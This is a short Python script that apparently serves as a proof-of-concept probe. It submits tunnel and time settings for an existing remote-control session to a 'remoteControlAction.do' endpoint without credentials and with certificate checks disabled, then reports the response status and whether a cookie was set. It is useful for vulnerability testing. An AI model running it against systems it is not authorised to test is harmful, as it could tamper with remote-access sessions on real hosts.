#!/usr/bin/env python3
import argparse

import requests
import urllib3


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("uuid", help="existing remote-control session UUID")
    parser.add_argument("--target", default="https://192.168.1.14:8443")
    parser.add_argument("--tunnel-type", default="TCP")
    parser.add_argument("--source-uri", default="127.0.0.1:1")
    parser.add_argument("--target-uri", default="127.0.0.1:2")
    parser.add_argument("--available", default="TCP")
    parser.add_argument("--start", default="2026-11-08 09:55:00")
    parser.add_argument("--end", default="2026-11-08 09:55:01")
    args = parser.parse_args()

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    response = requests.post(
        args.target.rstrip("/") + "/remoteControlAction.do",
        data={
            "method": "rcDetailsSubmit",
            "rcUUID": args.uuid,
            "startTime": args.start,
            "endTime": args.end,
            "tunnelType": args.tunnel_type,
            "sourceURI": args.source_uri,
            "targetURI": args.target_uri,
            "availableTunnelTypes": args.available,
        },
        allow_redirects=False,
        verify=False,
        timeout=30,
    )
    print(f"http={response.status_code} bytes={len(response.content)} set_cookie={'Set-Cookie' in response.headers}")


if __name__ == "__main__":
    main()
